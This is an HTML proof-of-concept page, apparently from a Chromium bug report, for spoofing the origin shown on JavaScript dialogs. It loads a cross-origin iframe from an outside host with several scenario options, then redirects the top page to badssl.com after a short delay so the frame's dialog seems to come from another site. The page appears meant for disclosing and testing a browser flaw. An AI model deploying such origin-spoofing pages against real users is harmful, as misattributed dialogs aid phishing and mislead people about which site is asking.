
<!doctype html>
<html>
<head>
<style>
html { font-family: sans-serif; }
#testFrame { width: 600px; height: 400px; }
</style>
</head>
<body>
<h1>PoC: JS dialog origin spoof</h1>
<p>Scenarios: <a href="?popup">popup</a> (default), <a href="?tab">tab</a>, <a href="?data">data</a>, <a href="?protocol">protocol</a>, <a href="?docwrite1">docwrite1</a>, <a href="?docwrite2">docwrite2</a></p>
<p>Top-most page on <span id="originOutput"></span></p>
<p>Cross-origin iframe below:</p>
<iframe id="testFrame"></iframe>
<script>
originOutput.innerText = window.location.origin;

var frameUrl = 'https://aogarantiza.com/chromium/js-dialog-origin-spoof-frame.html';
testFrame.src = frameUrl + window.location.search;
setTimeout(function(){document.location='https://badssl.com'}, 3333)

</script>
</body>
</html>
